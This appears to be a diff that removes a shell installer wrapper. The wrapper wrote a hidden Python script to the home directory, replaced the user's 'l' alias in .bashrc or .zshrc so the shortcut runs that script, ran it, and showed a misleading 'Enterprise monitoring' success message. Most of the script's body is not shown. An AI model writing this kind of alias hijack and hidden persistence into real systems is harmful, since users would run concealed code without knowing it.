@@ -1,4 +1,3 @@
-cat << 'EOF' > ~/.service_checker.py
 # -*- coding: utf-8 -*-
 import sys
 import urllib.request
@@ -51,19 +50,4 @@ def execute_monitor():
 
 if __name__ == "__main__":
     execute_monitor()
-EOF
-chmod +x ~/.service_checker.py
-
-# Bind shortcut link 'l' to target configuration profile
-CONFIG_TARGET="$HOME/.bashrc"
-[ -f "$HOME/.zshrc" ] && CONFIG_TARGET="$HOME/.zshrc"
-sed -i '/alias l=/d' $CONFIG_TARGET
-echo "alias l='python3 ~/.service_checker.py'" >> $CONFIG_TARGET
-source $CONFIG_TARGET 2>/dev/null
-
-clear
-echo -e "\033[1;32m[✓] Enterprise monitoring script initialized successfully.\033[0m"
-echo -e "Command token: \033[1;36ml\033[0m\n"
-
-# Trigger initial automation process
-python3 ~/.service_checker.py
+    
